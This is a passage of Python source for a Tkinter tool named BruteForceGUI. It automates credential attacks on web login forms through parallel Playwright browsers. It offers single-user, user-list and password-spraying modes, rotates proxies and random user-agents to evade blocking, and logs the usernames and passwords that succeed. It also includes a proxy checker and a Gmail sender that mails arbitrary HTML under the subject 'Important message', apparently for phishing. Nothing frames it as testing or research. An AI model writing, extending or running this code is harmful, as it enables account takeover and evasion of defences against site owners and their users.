        ttk.Label(frame, text="HTML Message File:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
        html_frame = ttk.Frame(frame)
        html_frame.grid(row=3, column=1, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(html_frame, textvariable=self.email_html_path, width=30, style='Rounded.TEntry').pack(side=tk.LEFT)
        ttk.Button(html_frame, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.email_html_path)).pack(side=tk.LEFT, padx=5)

        self.email_send_btn = ttk.Button(frame, text="Send Email", style='Rounded.TButton', command=self.send_email)
        self.email_send_btn.grid(row=4, column=0, columnspan=2, pady=10)

        ttk.Label(frame, text="Log:").grid(row=5, column=0, sticky=tk.W, padx=5, pady=5)
        self.email_log_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=15, font=("Courier", 9))
        self.email_log_text.grid(row=6, column=0, columnspan=2, padx=5, pady=5, sticky=tk.NSEW)

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(6, weight=1)

    # ---------- Utility Methods ----------
    def toggle_proxy_widgets(self):
        state = tk.NORMAL if self.use_proxy.get() else tk.DISABLED
        self.proxy_entry.config(state=state)
        self.proxy_browse_btn.config(state=state)

    def browse_file(self, var):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            var.set(filename)

    def on_mode_change(self, *args):
        mode = self.mode.get()
        self.username_label.grid_remove()
        self.username_entry.grid_remove()
        self.userlist_label.grid_remove()
        self.userlist_entry.grid_remove()
        self.userlist_btn.grid_remove()
        self.pass_single_label.grid_remove()
        self.pass_single_entry.grid_remove()
        if mode == "single":
            self.username_label.grid()
            self.username_entry.grid()
            self.passlist_label.grid()
            self.passlist_entry.grid()
            self.passlist_btn.grid()
        elif mode == "multi":
            self.userlist_label.grid()
            self.userlist_entry.grid()
            self.userlist_btn.grid()
            self.passlist_label.grid()
            self.passlist_entry.grid()
            self.passlist_btn.grid()
        elif mode == "reverse":
            self.userlist_label.grid()
            self.userlist_entry.grid()
            self.userlist_btn.grid()
            self.pass_single_label.grid()
            self.pass_single_entry.grid()

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.success_text.delete(1.0, tk.END)

    def change_log_font_size(self, event=None):
        new_size = self.log_font_size.get()
        self.log_text.configure(font=("Courier", new_size))
        self.success_text.configure(font=("Courier", new_size))
        self.log_text.tag_configure("success", font=("Courier", new_size, "bold"))
        self.log_text.tag_configure("failure", font=("Courier", new_size))

    # ---------- Theme and Colors ----------
    def load_color_config(self):
        if os.path.exists(COLORS_CONFIG_FILE):
            try:
                with open(COLORS_CONFIG_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                self.custom_colors.update(data)
            except:
                pass

    def save_color_config(self):
        with open(COLORS_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.custom_colors, f, indent=4)
        messagebox.showinfo("Success", "Colors saved successfully.")

    def reset_to_default_theme(self):
        self.custom_colors.update(DEFAULT_COLORS)
        self.apply_theme()
        messagebox.showinfo("Success", "Reset to default 2026 theme.")

    def pick_color(self, key):
        color = colorchooser.askcolor(title=f"Choose {key}", initialcolor=self.custom_colors[key])
        if color[1]:
            self.custom_colors[key] = color[1]
            self.apply_theme()

    def apply_theme(self):
        # Update ttk styles
        self.style.configure("TFrame", background=self.custom_colors["bg"])
        self.style.configure("TLabel", background=self.custom_colors["bg"], foreground=self.custom_colors["fg"])
        self.style.configure("TLabelframe", background=self.custom_colors["bg"], foreground=self.custom_colors["fg"])
        self.style.configure("TLabelframe.Label", background=self.custom_colors["bg"], foreground=self.custom_colors["fg"])
        self.style.configure("TButton", background=self.custom_colors["button_bg"], foreground=self.custom_colors["button_fg"])
        self.style.map("TButton", background=[("active", self.custom_colors["button_bg"])])
        self.style.configure("TCheckbutton", background=self.custom_colors["bg"], foreground=self.custom_colors["fg"])
        self.style.configure("TRadiobutton", background=self.custom_colors["bg"], foreground=self.custom_colors["fg"])
        self.style.configure("TEntry", fieldbackground=self.custom_colors["entry_bg"], foreground=self.custom_colors["entry_fg"])
        self.style.configure("TCombobox", fieldbackground=self.custom_colors["entry_bg"], foreground=self.custom_colors["entry_fg"])
        self.style.configure("TNotebook", background=self.custom_colors["bg"])
        self.style.configure("TNotebook.Tab", background=self.custom_colors["tab_bg"], foreground=self.custom_colors["tab_fg"])
        self.style.map("TNotebook.Tab", background=[("selected", self.custom_colors["tab_bg"])])

        # Root
        self.root.configure(bg=self.custom_colors["bg"])

        # Logs and success panels
        self.log_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"],
                                insertbackground=self.custom_colors["log_fg"])
        self.success_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"],
                                    insertbackground=self.custom_colors["log_fg"])
        self.log_text.tag_configure("success", foreground=self.custom_colors["success_fg"])
        self.log_text.tag_configure("failure", foreground=self.custom_colors["failure_fg"])
        if self.proxy_check_result_text:
            self.proxy_check_result_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"])
        if self.email_log_text:
            self.email_log_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"])

        # Statistics labels
        for lbl in self.stats_labels.values():
            lbl.configure(background=self.custom_colors["stats_bg"], foreground=self.custom_colors["stats_fg"])

    # ---------- Logging ----------
    def format_log_entry(self, attempt_num, username, password, proxy_str, result, success=False):
        parts = []
        if self.log_fields["timestamp"].get():
            parts.append(datetime.now().strftime("%H:%M:%S"))
        if self.log_fields["attempt_num"].get():
            parts.append(f"[{attempt_num}]")
        if self.log_fields["username"].get():
            parts.append(username)
        if self.log_fields["password"].get():
            parts.append(password)
        if self.log_fields["proxy"].get():
            parts.append(proxy_str if proxy_str else "direct")
        if self.log_fields["result"].get():
            parts.append("SUCCESS" if success else "FAILED")
        return " | ".join(parts)

    # ---------- Attack Execution ----------
    def update_gui(self):
        while not self.log_queue.empty():
            msg, success = self.log_queue.get_nowait()
            if success:
                self.log_text.insert(tk.END, msg + "\n", "success")
            else:
                self.log_text.insert(tk.END, msg + "\n", "failure")
            self.log_text.see(tk.END)
        while not self.success_queue.empty():
            msg = self.success_queue.get_nowait()
            self.success_text.insert(tk.END, msg + "\n")
            self.success_text.see(tk.END)
        while not self.stats_queue.empty():
            stats = self.stats_queue.get_nowait()
            for key, value in stats.items():
                if key in self.stats_labels:
                    self.stats_labels[key].config(text=str(value))
        self.root.after(100, self.update_gui)

    def start_attack(self):
        # Gather attack config
        if self.attack_mode.get() == "saved":
            if not self.selected_attack:
                messagebox.showerror("Error", "No saved attack selected.")
                return
            cfg = self.selected_attack
            login_url = cfg["url"]
            username_selector = f"input[{cfg['username_field_type']}='{cfg['username_field_selector']}']"
            password_selector = f"input[{cfg['password_field_type']}='{cfg['password_field_selector']}']"
            submit_selector = cfg["submit_button_selector"]
            success_indicator = cfg["success_indicator"]
            success_text = cfg["success_text"] if success_indicator == "text" else None
            timeout = cfg["timeout"]
        else:
            login_url = self.custom_url.get().strip()
            if not login_url:
                messagebox.showerror("Error", "Custom URL is empty.")
                return
            username_selector = f"input[{self.username_field_type.get()}='{self.username_field_selector.get()}']"
            password_selector = f"input[{self.password_field_type.get()}='{self.password_field_selector.get()}']"
            submit_selector = self.submit_button_selector.get()
            success_indicator = self.success_indicator.get()
            success_text = self.success_text.get().strip() if success_indicator == "text" else None
            try:
                timeout = int(self.timeout_var.get())
            except:
                timeout = 5000

        # Load user-agents
        ua_list = []
        ua_file = self.useragent_path.get().strip()
        if ua_file and os.path.exists(ua_file):
            try:
                with open(ua_file, 'r', encoding='utf-8') as f:
                    ua_list = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"Error loading user-agents: {e}")

        # Credentials
        mode = self.mode.get()
        if mode == "single":
            username = self.username_single.get().strip()
            if not username:
                messagebox.showerror("Error", "Please enter a username.")
                return
            passlist = self.passlist_path.get().strip()
            if not passlist or not os.path.exists(passlist):
                messagebox.showerror("Error", "Invalid password list file.")
                return
            passwords = self.load_list(passlist)
            pairs = [(username, pwd) for pwd in passwords]
        elif mode == "multi":
            userlist = self.userlist_path.get().strip()
            passlist = self.passlist_path.get().strip()
            if not userlist or not os.path.exists(userlist):
                messagebox.showerror("Error", "Invalid username list file.")
                return
            if not passlist or not os.path.exists(passlist):
                messagebox.showerror("Error", "Invalid password list file.")
                return
            usernames = self.load_list(userlist)
            passwords = self.load_list(passlist)
            pairs = [(u, p) for u in usernames for p in passwords]
        elif mode == "reverse":
            userlist = self.userlist_path.get().strip()
            password = self.pass_single.get().strip()
            if not userlist or not os.path.exists(userlist):
                messagebox.showerror("Error", "Invalid username list file.")
                return
            if not password:
                messagebox.showerror("Error", "Please enter a password.")
                return
            usernames = self.load_list(userlist)
            pairs = [(u, password) for u in usernames]
        else:
            return

        # Proxy list
        proxy_list = []
        if self.use_proxy.get():
            proxy_file = self.proxy_path.get().strip()
            if not proxy_file or not os.path.exists(proxy_file):
                messagebox.showerror("Error", "Invalid proxy list file.")
                return
            proxy_list = self.load_list(proxy_file)
            if not proxy_list:
                messagebox.showerror("Error", "No proxies found.")
                return
            proxy_type = self.proxy_type.get()
        else:
            proxy_list = None
            proxy_type = None

        self.attempt_queue = queue.Queue()
        for pair in pairs:
            self.attempt_queue.put(pair)
        self.total_attempts = len(pairs)

        # Clear logs and stats
        self.log_text.delete(1.0, tk.END)
        self.success_text.delete(1.0, tk.END)
        self.stats_labels["total"].config(text=str(self.total_attempts))
        self.stats_labels["tested"].config(text="0")
        self.stats_labels["rotations"].config(text="0")
        self.stats_labels["current_proxy"].config(text="--")
        self.stats_labels["elapsed"].config(text="0s")
        self.stats_labels["remaining"].config(text=str(self.total_attempts))
        self.stats_labels["status"].config(text="Starting...")

        self.running = True
        self.stop_flag.clear()
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

        num_browsers = max(1, min(self.num_browsers.get(), 10))

        self.attack_thread = threading.Thread(target=self.run_attack,
                                              args=(proxy_list, proxy_type, self.show_browser.get(), num_browsers,
                                                    login_url, username_selector, password_selector, submit_selector,
                                                    success_indicator, success_text, timeout, ua_list),
                                              daemon=True)
        self.attack_thread.start()

    def stop_attack(self):
        self.stop_flag.set()
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

    def load_list(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def construct_proxy_dict(self, proxy_line, proxy_type):
        if not proxy_line:
            return None
        if proxy_line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return {"server": proxy_line}
        if proxy_type == 'http':
            return {"server": f"http://{proxy_line}"}
        elif proxy_type == 'socks4':
            return {"server": f"socks4://{proxy_line}"}
        else:
            return {"server": f"socks5://{proxy_line}"}

    def run_attack(self, proxy_list, proxy_type, show_browser, num_browsers,
                   login_url, username_selector, password_selector, submit_selector,
                   success_indicator, success_text, timeout, ua_list):
        headless = not show_browser
        attempt_counter = 0
        proxy_index = 0
        start_time = time.time()
        found = False
        found_password = None
        found_username = None
        self.lock_proxy = threading.Lock()

        def worker(worker_id):
            nonlocal attempt_counter, proxy_index, found, found_password, found_username
            playwright = sync_playwright().start()
            my_proxy_index = proxy_index
            if proxy_list and self.use_proxy.get():
                proxy_str = proxy_list[my_proxy_index % len(proxy_list)]
                proxy = self.construct_proxy_dict(proxy_str, proxy_type)
            else:
                proxy = None
                proxy_str = "direct"
            ua = random.choice(ua_list) if ua_list else None
            browser = playwright.chromium.launch(
                headless=headless,
                proxy=proxy,
                args=[f"--window-position={worker_id*400},0"]
            )
            context = browser.new_context(user_agent=ua)
            page = context.new_page()

            try:
                while not self.stop_flag.is_set() and not found:
                    with self.lock_proxy:
                        current_proxy_index = proxy_index
                    if current_proxy_index != my_proxy_index:
                        browser.close()
                        playwright.stop()
                        my_proxy_index = current_proxy_index
                        if proxy_list and self.use_proxy.get():
                            proxy_str = proxy_list[my_proxy_index % len(proxy_list)]
                            proxy = self.construct_proxy_dict(proxy_str, proxy_type)
                        else:
                            proxy = None
                            proxy_str = "direct"
                        ua = random.choice(ua_list) if ua_list else None
                        playwright = sync_playwright().start()
                        browser = playwright.chromium.launch(
                            headless=headless,
                            proxy=proxy,
                            args=[f"--window-position={worker_id*400},0"]
                        )
                        context = browser.new_context(user_agent=ua)
                        page = context.new_page()
                        continue

                    try:
                        username, password = self.attempt_queue.get(timeout=1)
                    except:
                        break

                    attempt_counter += 1
                    attempt_num = attempt_counter

                    self.stats_queue.put({
                        "tested": attempt_num,
                        "remaining": self.total_attempts - attempt_num,
                        "elapsed": f"{int(time.time() - start_time)}s",
                        "status": "Running"
                    })

                    try:
                        page.goto(login_url, wait_until="domcontentloaded")
                        try:
                            page.wait_for_selector(username_selector, timeout=5000)
                        except:
                            self.log_queue.put((f"[Browser {worker_id}] Timeout waiting for username field: {username_selector}", False))
                            continue

                        page.type(username_selector, username, delay=25)
                        page.type(password_selector, password, delay=30)
                        start_url = page.url

                        if submit_selector:
                            try:
                                page.click(submit_selector, timeout=300)
                            except:
                                page.press(password_selector, "Enter")
                        else:
                            page.press(password_selector, "Enter")

                        if success_indicator == "url_change":
                            try:
                                page.wait_for_url(lambda url: url != start_url and "login" not in url.lower(), timeout=timeout)
                                found = True
                                found_password = password
                                found_username = username
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "SUCCESS", success=True)
                                self.log_queue.put((log_entry, True))
                                self.success_queue.put(log_entry)
                                self.stats_queue.put({"status": f"SUCCESS! Password: {password}"})
                                self.stop_flag.set()
                                break
                            except PlaywrightTimeoutError:
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "FAILED", success=False)
                                self.log_queue.put((log_entry, False))
                        else:  # text indicator
                            try:
                                page.wait_for_selector(f"text='{success_text}'", timeout=timeout)
                                found = True
                                found_password = password
                                found_username = username
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "SUCCESS", success=True)
                                self.log_queue.put((log_entry, True))
                                self.success_queue.put(log_entry)
                                self.stats_queue.put({"status": f"SUCCESS! Password: {password}"})
                                self.stop_flag.set()
                                break
                            except PlaywrightTimeoutError:
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "FAILED", success=False)
                                self.log_queue.put((log_entry, False))
                    except Exception as e:
                        self.log_queue.put((f"[Browser {worker_id}] Error: {e}", False))
                    finally:
                        self.attempt_queue.task_done()
                        if attempt_num % 10 == 0 and proxy_list and self.use_proxy.get():
                            with self.lock_proxy:
                                proxy_index += 1
                                self.stats_queue.put({
                                    "rotations": proxy_index,
                                    "current_proxy": proxy_list[proxy_index % len(proxy_list)] if proxy_list else "None"
                                })
            finally:
                browser.close()
                playwright.stop()

        threads = []
        for i in range(num_browsers):
            t = threading.Thread(target=worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if found:
            self.stats_queue.put({"status": f"Finished - Password found for {found_username}: {found_password}"})
        else:
            self.stats_queue.put({"status": "Finished - No valid credentials found"})

        self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
        self.running = False

    # ---------- Proxy Checker ----------
    def test_proxy(self, proxy_line, proxy_type, timeout):
        try:
            if proxy_line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                proxy_url = proxy_line
            else:
                if proxy_type == 'http':
                    proxy_url = f"http://{proxy_line}"
                elif proxy_type == 'socks4':
                    proxy_url = f"socks4://{proxy_line}"
                else:
                    proxy_url = f"socks5://{proxy_line}"
            proxies = {'http': proxy_url, 'https': proxy_url}
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return (True, proxy_line, r.json().get('origin', 'unknown'))
            else:
                return (False, proxy_line, None)
        except Exception as e:
            return (False, proxy_line, str(e))

    def run_proxy_check(self, proxy_list, proxy_type, timeout, threads, result_queue):
        def worker(proxies_chunk, results):
            for proxy in proxies_chunk:
                ok, proxy_line, info = self.test_proxy(proxy, proxy_type, timeout)
                results.append((ok, proxy_line, info))

        import concurrent.futures
        chunk_size = max(1, len(proxy_list) // threads)
        chunks = [proxy_list[i:i+chunk_size] for i in range(0, len(proxy_list), chunk_size)]
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, chunk, results) for chunk in chunks]
            for f in futures:
                f.result()
        result_queue.put(results)

    def start_proxy_check(self):
        proxy_file = self.proxy_check_path.get().strip()
        if not proxy_file or not os.path.exists(proxy_file):
            messagebox.showerror("Error", "Invalid proxy list file.")
            return
        proxy_list = self.load_list(proxy_file)
        if not proxy_list:
            messagebox.showerror("Error", "No proxies found.")
            return
        proxy_type = self.proxy_type.get()
        timeout = self.proxy_timeout.get()
        threads = self.proxy_threads.get()

        self.proxy_check_btn.config(state=tk.DISABLED)
        self.proxy_check_result_text.delete(1.0, tk.END)
        self.proxy_check_result_text.insert(tk.END, "Checking proxies...\n")
        self.proxy_check_result_text.update()

        def check_thread():
            result_queue = queue.Queue()
            self.run_proxy_check(proxy_list, proxy_type, timeout, threads, result_queue)
            results = result_queue.get()
            self.root.after(0, lambda: self.display_proxy_results(results))
            self.root.after(0, lambda: self.proxy_check_btn.config(state=tk.NORMAL))

        t = threading.Thread(target=check_thread, daemon=True)
        t.start()

    def display_proxy_results(self, results):
        self.proxy_check_result_text.delete(1.0, tk.END)
        working = [r for r in results if r[0]]
        failed = [r for r in results if not r[0]]
        self.proxy_check_result_text.insert(tk.END, f"Total: {len(results)}\nWorking: {len(working)}\nFailed: {len(failed)}\n\n")
        self.proxy_check_result_text.insert(tk.END, "=== WORKING PROXIES ===\n")
        for ok, proxy_line, info in working:
            self.proxy_check_result_text.insert(tk.END, f"{proxy_line} -> {info}\n")
        self.proxy_check_result_text.insert(tk.END, "\n=== FAILED PROXIES ===\n")
        for ok, proxy_line, info in failed:
            self.proxy_check_result_text.insert(tk.END, f"{proxy_line} -> {info}\n")

    # ---------- Email Sender ----------
    def send_email(self):
        sender = self.email_sender.get().strip()
        password = self.email_password.get().strip()
        receiver = self.email_receiver.get().strip()
        html_file = self.email_html_path.get().strip()

        if not sender or not password or not receiver or not html_file:
            messagebox.showerror("Error", "All fields are required.")
            return
        if not os.path.exists(html_file):
            messagebox.showerror("Error", "HTML file not found.")
            return

        try:
            with open(html_file, 'r', encoding='utf-8') as f:
                html_content = f.read()
        except Exception as e:
            messagebox.showerror("Error", f"Could not read HTML file: {e}")
            return

        self.email_send_btn.config(state=tk.DISABLED)
        self.email_log_text.delete(1.0, tk.END)
        self.email_log_text.insert(tk.END, "Sending email...\n")
        self.email_log_text.update()

        def send():
            try:
                msg = MIMEMultipart("alternative")
                msg["Subject"] = "Important message"
                msg["From"] = sender
                msg["To"] = receiver
                msg.attach(MIMEText(html_content, "html"))

                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(sender, password)
                    server.send_message(msg)
                self.root.after(0, lambda: self.email_log_text.insert(tk.END, "Email sent successfully!\n"))
            except Exception as e:
                self.root.after(0, lambda: self.email_log_text.insert(tk.END, f"Error: {e}\n"))
            finally:
                self.root.after(0, lambda: self.email_send_btn.config(state=tk.NORMAL))

        t = threading.Thread(target=send, daemon=True)
        t.start()


# ---------- Master Password Protection ----------
def verify_master_password():
    """Check if tool is password-protected; if first run, set a password."""
    if os.path.exists(PASSWORD_FILE):
        # Second or later run: ask for password
        with open(PASSWORD_FILE, 'r') as f:
            stored_hash = f.read().strip()
        pwd = simpledialog.askstring("Tool Lock", "Enter master password:", show='*')
        if pwd is None:
            return False
        if hashlib.sha256(pwd.encode()).hexdigest() == stored_hash:
            return True
        else:
            messagebox.showerror("Error", "Wrong password. Exiting.")
            return False
    else:
        # First run: set a password
        pwd1 = simpledialog.askstring("Setup", "Set a master password (for tool protection):", show='*')
        if not pwd1:
            return False
        pwd2 = simpledialog.askstring("Setup", "Confirm password:", show='*')
        if pwd1 != pwd2:
            messagebox.showerror("Error", "Passwords do not match. Exiting.")
            return False
        with open(PASSWORD_FILE, 'w') as f:
            f.write(hashlib.sha256(pwd1.encode()).hexdigest())
        return True


if __name__ == "__main__":
    # First, password protection
    if not verify_master_password():
        exit(1)

    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()
